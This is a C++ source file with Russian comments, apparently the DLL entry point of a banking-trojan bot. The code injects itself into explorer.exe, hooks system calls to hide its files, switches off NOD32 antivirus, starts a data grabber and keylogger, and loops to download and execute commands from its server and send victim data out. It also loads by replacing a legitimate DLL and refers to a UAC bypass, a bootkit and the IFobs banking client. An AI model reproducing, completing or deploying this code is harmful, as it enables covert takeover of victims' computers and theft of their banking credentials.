// dllmain.cpp: определяет точку входа для приложения DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"


#include "Crypt.h"
#include "BootkitCrypt.h"
#include "Modules.h"
#include "ntdll.h"
#include "coocksol.h"
#include "md5.h"
#include "DbgRpt.h"

#include "BotAutoUpdate.h"

#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  Система отладочных строк
//------------------------------------------------------------------------------
#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
DWORD dwWebMoneySelf = 0;

//глобальные переменные для хранения данных при запуске чере Fake.dll
char FakeDllPathBot[MAX_PATH]; //путь к шифрованному телу бота (bot.plug)
char FakeDllPathDll[MAX_PATH]; //путь к самой Fake.dll, ее заменена оригинальная dll
char FakeDllPathOrigDll[MAX_PATH]; //путь к оригинальной длл
char FakeDllCryptKey[32]; //ключ для шифрования тела бота
int FakeDllLenCryptKey = 0; //длина ключа шифрования тела бота

//DWORD dwExplorerPid  = 0; //пид эксплорера

DWORD WINAPI LoaderRoutine(LPVOID Data);

BOOL RunLoaderRoutine()
{
/*
#ifdef UAC_bypassH
	if( !RunBotBypassUAC(0) )
		return MegaJump( LoaderRoutine );
	return true;
#else
*/
	return MegaJump( LoaderRoutine );
//#endif
}

BOOL RunVideoProcess()
{
	DLLDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
	return MegaJump( VideoProcess::StartSvchost );
}



DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	BOT::Initialize(ProcessLoader);

	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");

	switch( BOT::GetBotType() )
	{
		//если стартовали из под буткита, то удаляем ring3 бота из автозагрузки
		case BotBootkit: 
			BOT::UninstallService();
			BOT::DeleteAutorunBot();
			break;

		// При запуске из под лоадера стартуем автообновление
		case BotLoaderPlugin:
			StartAutoUpdate();
			break;
	}

	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Инициализируем систему отправки статистической информации
	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}

	// 402_pl запуск цикла получения команд (он получается в другом процессе)
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));

	// Запускаем поток отправки данных
	DataGrabber::StartDataSender();

	// Стартуем поток обновления списка процессов кейлогера
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;

	#ifdef VideoRecorderH
		#ifndef VideoProcessSvchost
			if( VideoProcess::Start() )
				DLLDBG( "Main", "Запустили видео процесс" );
			else
				DLLDBG( "Main", "ERROR: не запустился видео процесс" );
		#endif //VideoProcessSvchost
	#endif

	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
	if (InitializeTaskManager(NULL, true))
	{
		while (true)
		{
			// 403_pl цикл получения команд
			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
			
			DownloadAndExecuteCommand(NULL, NULL);

			// "Гениальность" проектирования взаимосвязи бота и его сервера
			// отправка стартовой информации должна идти только после получения
			// команды
			if (!FirstSended)
			{
				DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
				FirstSended = SendFirstInfo();
			}


			// Приостанавливаем выполнение команд
			if (!TaskManagerSleep(NULL))
				break;
		}
	}
	pExitProcess(0);
	return 0;
}

DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "Запускаем бот:\n Префикс [%s] \n WorkPath: %s", GetPrefix().t_str(), BOT::WorkPath().t_str());
	
	//копируем префикс из временного файла, который был сохранен инсталером буткита
	BOT::SavePrefixFromTemporaryFile(false);
	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();
	
	// Инициализируем систему отправки статистической информации
	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
	RunLoaderRoutine();

	#ifdef VideoProcessSvchost
		RunVideoProcess();
	#endif

	DLLDBG( "Main", "Отключаем NOD32" );
	OffNOD32();

	// 401_pl запуск BotPlug
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("401_pl"));
	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "Стартуем грабер");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// Вызываем событие мтарта експлорера

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}

//-----------------------------------------------------------
//  Start - Фуекция запускает плагин на выполнение.
//          Вызов данной функции подразцмевает то, что dll 
//          была загружена из памяти без вызова стартовой
//          функции dll.
//-----------------------------------------------------------
extern"C"  void WINAPI Start(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin)
{
	if (Initialize)
	{
		BOT::Initialize(ProcessUnknown);
		if (IsLoaderPlugin)
			BOT::SetBotType(BotLoaderPlugin);
	}
	if (Start)
	{
		HANDLE H = StartThread(ExplorerMain, NULL);
	}
}


//-----------------------------------------------------------
//  Start32 - Экспортируемая функция, запуска плагина
//            в 32 разрядном процессе 
//-----------------------------------------------------------
DWORD WINAPI Start32(LPVOID)
{
	BOT::Initialize();
	string Message;
	Message.Format("Injected in process %s", Bot->ApplicationName().t_str());
	pMessageBoxA(0, Message.t_str(), "Inject report", 0);
	return 0;
}



//-----------------------------------------------------------
// MyDllMain - Точка входа DLL
//-----------------------------------------------------------
BOOL APIENTRY MyDllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{
	char buf[MAX_PATH];
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			BOT::Initialize(ProcessUnknown);
#ifdef UAC_bypassH
			//смотрим возможно ботплаг запустили после обхода UAC
			if( ExecTaskAfterUAC() ) return TRUE;
#endif //UAC_bypassH

			pGetModuleFileNameA( NULL, buf, MAX_PATH );
			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
			{
				if( BOT::CreateBootkitMutex())
				{
					BOT::SetBotType(BotBootkit);
					StartThread(ExplorerMain, NULL);
				}
			}
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}

bool FakeDllDelete()
{
	BOT::DeleteBotFile(FakeDllPathBot);
	//если восстановить оригинальную длл сразу невозможно (ее держит браузер), то восстанавливаем после ребута
	if( !pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING ) )
		pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
	return true;
}

//функция физического удаления бота в отдельном процессе
DWORD WINAPI DeleteFakeDllInSvchost(LPVOID Data)
{
	BOT::Initialize(ProcessUnknown);
	pSleep(10 * 1000); //ждем некоторое время
	DLLDBG( "DeleteFakeDllInSvchost", "Unisntall fake dll" );
	KillAllBrowsers();
	pSleep(5 * 1000);
	FakeDllDelete();
	return 0;
}

// Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
{
	BOT::Initialize(ProcessUnknown);
	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
	// При загрузке просто вызывает Start, предусмотренную для
	// обычного запуска Bot.plug
	BOT::SetBotType(BotFakeDll);
	#ifdef IFobsH
		RunThread( IFobs::KillIFobs, (void*)10 );
	#endif
	Start(TRUE, TRUE, FALSE);
	return 0;
}

// Експортируемая ф-ция для запуска Bot.plug из FakeDll.
// pathBotPlug - путь в котором находится этот бот
// pathFakeDll - путь к fake.dll 
// pathOrigDll - путь к длл которую подменили на fake.dll
// cryptKey - ключ для шифрования тела бота при обновлении (строковая строка)
// эти параметры необходимы для удаления и обновления бота
BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey )
{
//	BOT::Initialize();
	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );

	m_lstrcpy( FakeDllPathBot, pathBotPlug );
	m_lstrcpy( FakeDllPathDll, pathFakeDll );
	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
	FakeDllLenCryptKey = m_lstrlen(cryptKey);
	m_memcpy( FakeDllCryptKey, cryptKey, FakeDllLenCryptKey );
	FakeDllCryptKey[FakeDllLenCryptKey] = 0;

	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s'", cryptKey );

	if( BOT::BootkitIsRun() ) //если запущен буткит, то удаляем эту версию бота
	{
		MegaJump(DeleteFakeDllInSvchost);
	}
	else
	{
		// Смотрим на то - запущен ли бот
		HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();

		DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
		if (BotInstanceMutex )
		{
			pCloseHandle(BotInstanceMutex); //закрываем мютекс, чтобы его снова создали в процессе explorer.exe
			return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
		}
	}
	return FALSE;
}
